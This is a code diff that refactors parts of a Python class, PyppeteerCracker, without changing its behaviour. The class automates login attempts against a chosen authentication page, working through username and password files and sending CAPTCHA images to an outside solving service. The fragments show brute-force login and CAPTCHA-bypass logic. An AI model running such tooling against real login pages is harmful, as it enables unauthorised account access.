@@ -31,25 +31,21 @@ class PyppeteerCracker:
 
         self.session_time = session_time
 
-        if self.usernamefile == None:
+        if self.usernamefile is None:
             self.usernamefile = str(
                 input("Please enter the path to the usernames file:"))
 
-        if self.passwordfile == None:
+        if self.passwordfile is None:
             self.passwordfile = str(
                 input("Please enter the path to the passwords file:"))
 
         lines = open(self.usernamefile).readlines()
-        for line in lines:
-            self.users.append(line.replace("\n", ""))
-
+        self.users.extend(line.replace("\n", "") for line in lines)
         lines = open(self.passwordfile).readlines()
-        for line in lines:
-            self.passwords.append(line.replace("\n", ""))
-
+        self.passwords.extend(line.replace("\n", "") for line in lines)
         self.attacking_url = attacking_url
 
-        if self.attacking_url == None:
+        if self.attacking_url is None:
             self.attacking_url = str(
                 input("Please enter the URL of the authentication page you want to automate:"))
 
@@ -66,34 +62,25 @@ class PyppeteerCracker:
     async def check_on_captcha_page(self, page):
         check_for_captcha = self.check_captcha
         content = await page.evaluate('document.body.textContent', force_expr=True)
-        if check_for_captcha in content:
-            return True
-        else:
-            return False
+        return check_for_captcha in content
 
     async def check_on_login_page(self, page):
         check_for_login = self.check_login
         content = await page.evaluate('document.body.textContent', force_expr=True)
-        if check_for_login in content:
-            return True
-        else:
-            return False
+        return check_for_login in content
 
     async def check_login_failed(self, page):
         check_for_login = self.verify_login
         content = await page.evaluate('document.body.textContent', force_expr=True)
-        if check_for_login in content:
-            return True
-        else:
-            return False
+        return check_for_login in content
 
     async def step(self):
         input("Enter to continue: ")
 
     async def login(self, page, username, password):
-        self.logger.info("Testing user: "+str(username))
+        self.logger.info(f"Testing user: {str(username)}")
 
-        await page.click('input[name='+self.username_field+']')
+        await page.click(f'input[name={self.username_field}]')
         time.sleep(0.1)
         await page.keyboard.down('Control')
         time.sleep(0.1)
@@ -103,9 +90,9 @@ class PyppeteerCracker:
         time.sleep(0.1)
         await page.keyboard.press('Backspace')
         time.sleep(0.1)
-        await page.type('#'+self.username_field+'', username)
+        await page.type(f'#{self.username_field}', username)
         time.sleep(0.1)
-        await page.type('#'+self.password_field+'', password)
+        await page.type(f'#{self.password_field}', password)
         time.sleep(0.1)
         await page.keyboard.press('Enter')
         await page.waitForNavigation()
@@ -131,8 +118,8 @@ class PyppeteerCracker:
             # Send image to API
             captcha = self.cracker.solve_captcha_b64(img_source)
 
-            self.logger.info("Submitting captcha as: " + str(captcha))
-            await page.type('#'+self.captcha_field, captcha)
+            self.logger.info(f"Submitting captcha as: {str(captcha)}")
+            await page.type(f'#{self.captcha_field}', captcha)
             await page.keyboard.press('Enter')
             time.sleep(0.5)
 
